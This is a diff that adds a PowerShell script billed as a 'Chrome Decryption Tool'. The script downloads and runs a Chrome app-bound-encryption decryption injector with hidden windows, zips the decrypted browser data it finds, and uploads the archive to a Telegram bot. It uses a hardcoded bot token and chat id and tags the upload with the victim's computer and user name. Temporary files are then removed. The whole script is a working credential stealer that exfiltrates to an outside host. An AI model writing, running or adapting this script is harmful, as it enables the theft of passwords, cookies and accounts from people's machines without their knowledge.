@@ -1,0 +1,179 @@
+# Chrome Decryption Tool - Download, Execute & Send Results
+# =========================================================
+
+# Configuration
+$zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.3/chrome-injector-v0.17.3.zip"
+$extractPath = "$env:TEMP\ChromeDecryptor"
+$botToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
+$chatId = "2146236602"
+
+Write-Host "🔓 Chrome Password Decryption Tool" -ForegroundColor Cyan
+Write-Host "==================================" -ForegroundColor Cyan
+
+# Function to send file to Telegram
+function Send-ToTelegram {
+    param([string]$FilePath, [string]$Caption)
+    
+    try {
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        
+        $bodyLines = (
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"chat_id`"",
+            "",
+            $chatId,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"caption`"",
+            "",
+            $Caption,
+            "--$boundary",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/zip",
+            "",
+            $fileEnc,
+            "--$boundary--"
+        ) -join $LF
+
+        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
+        $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        
+        if ($response.ok) {
+            Write-Host "✅ File sent to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
+            return $true
+        }
+        return $false
+    } catch {
+        Write-Host "❌ Telegram error: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# STEP 1: DOWNLOAD
+Write-Host "`n⬇️  Downloading tool..." -ForegroundColor Yellow
+$zipFile = "$extractPath\chrome.zip"
+
+# Create folder
+if (-not (Test-Path $extractPath)) {
+    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
+}
+
+# Download
+try {
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing
+    Write-Host "✅ Download complete" -ForegroundColor Green
+} catch {
+    Write-Host "❌ Download failed" -ForegroundColor Red
+    exit 1
+}
+
+# STEP 2: EXTRACT
+Write-Host "`n📦 Extracting files..." -ForegroundColor Yellow
+try {
+    Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
+    Remove-Item $zipFile -Force
+    Write-Host "✅ Extraction complete" -ForegroundColor Green
+} catch {
+    Write-Host "❌ Extraction failed" -ForegroundColor Red
+    exit 1
+}
+
+# STEP 3: FIND EXECUTABLES
+Write-Host "`n🔍 Finding executables..." -ForegroundColor Yellow
+Set-Location $extractPath
+
+$arm64Exe = Get-ChildItem -Filter "*arm64.exe" -Recurse | Select-Object -First 1
+$x64Exe = Get-ChildItem -Filter "*x64.exe" -Recurse | Select-Object -First 1
+
+if (-not $arm64Exe -and -not $x64Exe) {
+    Write-Host "❌ No executables found" -ForegroundColor Red
+    exit 1
+}
+
+Write-Host "✅ Found executables:" -ForegroundColor Green
+if ($arm64Exe) { Write-Host "  • $($arm64Exe.Name)" -ForegroundColor Cyan }
+if ($x64Exe) { Write-Host "  • $($x64Exe.Name)" -ForegroundColor Cyan }
+
+# STEP 4: EXECUTE WITH -k all PARAMETER
+Write-Host "`n🚀 Executing decryption tools with -k all..." -ForegroundColor Magenta
+
+$processes = @()
+
+# Execute x64 with -k all
+if ($x64Exe) {
+    Write-Host "`n🔧 Running: $($x64Exe.Name) -k all" -ForegroundColor Yellow
+    $process = Start-Process -FilePath $x64Exe.FullName -ArgumentList "-k all" -PassThru -WindowStyle Hidden
+    $processes += $process
+    Write-Host "✅ x64 started (PID: $($process.Id))" -ForegroundColor Green
+}
+
+# Execute ARM64 with -k all
+if ($arm64Exe) {
+    Write-Host "`n🔧 Running: $($arm64Exe.Name) -k all" -ForegroundColor Yellow
+    $process = Start-Process -FilePath $arm64Exe.FullName -ArgumentList "-k all" -PassThru -WindowStyle Hidden
+    $processes += $process
+    Write-Host "✅ ARM64 started (PID: $($process.Id))" -ForegroundColor Green
+}
+
+# Wait for processes to complete
+Write-Host "`n⏳ Waiting for execution to complete..." -ForegroundColor Yellow
+$processes | Wait-Process
+Write-Host "✅ Execution completed" -ForegroundColor Green
+
+# STEP 5: CHECK FOR OUTPUT FOLDER
+Write-Host "`n🔍 Checking for output folder..." -ForegroundColor Yellow
+Start-Sleep -Seconds 2
+
+$outputFolder = Get-ChildItem -Path $extractPath -Filter "output" -Directory -Recurse | Select-Object -First 1
+
+if ($outputFolder -and (Test-Path $outputFolder.FullName)) {
+    Write-Host "✅ Output folder found: $($outputFolder.FullName)" -ForegroundColor Green
+    
+    # Count files in output folder
+    $fileCount = (Get-ChildItem -Path $outputFolder.FullName -Recurse -File).Count
+    Write-Host "  📁 Contains $fileCount files" -ForegroundColor Cyan
+    
+    # Create zip file
+    $zipFileName = "Chrome_Decrypt_Output_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+    $zipPath = "$extractPath\$zipFileName"
+    
+    Write-Host "`n📦 Creating zip archive..." -ForegroundColor Yellow
+    try {
+        Compress-Archive -Path $outputFolder.FullName -DestinationPath $zipPath -Force
+        Write-Host "✅ Zip created: $zipFileName" -ForegroundColor Green
+        
+        # Send to Telegram
+        Write-Host "`n📤 Sending to Telegram..." -ForegroundColor Yellow
+        $caption = "🔓 Chrome Decryption Output`n🖥️ $env:COMPUTERNAME`n👤 $env:USERNAME`n📁 Files: $fileCount`n⏰ $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        
+        if (Send-ToTelegram -FilePath $zipPath -Caption $caption) {
+            Write-Host "✅ Results sent to Telegram!" -ForegroundColor Green
+        }
+        
+        # Cleanup zip
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+        Write-Host "🗑️ Temporary files cleaned" -ForegroundColor Gray
+        
+    } catch {
+        Write-Host "❌ Zip creation failed: $($_.Exception.Message)" -ForegroundColor Red
+    }
+} else {
+    Write-Host "❌ No output folder found after execution" -ForegroundColor Red
+    Write-Host "Checking in: $extractPath" -ForegroundColor Yellow
+}
+
+# STEP 6: SUMMARY
+Write-Host "`n" + "="*50 -ForegroundColor Cyan
+Write-Host "📊 SUMMARY" -ForegroundColor Cyan
+Write-Host "="*50 -ForegroundColor Cyan
+Write-Host "• Tool folder: $extractPath" -ForegroundColor Gray
+Write-Host "• Executables run: $(if($x64Exe){'x64 '}else{''})$(if($arm64Exe){'ARM64'}else{''})" -ForegroundColor Gray
+Write-Host "• Parameters: -k all" -ForegroundColor Gray
+Write-Host "• Output folder: $(if($outputFolder){'Found'}else{'Not found'})" -ForegroundColor Gray
+Write-Host "• Files found: $(if($outputFolder){$fileCount}else{'0'})" -ForegroundColor Gray
+Write-Host "• Results sent: $(if($outputFolder){'Yes'}else{'No'})" -ForegroundColor Gray
+Write-Host "="*50 -ForegroundColor Cyan
+
+Write-Host "`n✅ Chrome decryption completed!" -ForegroundColor Green
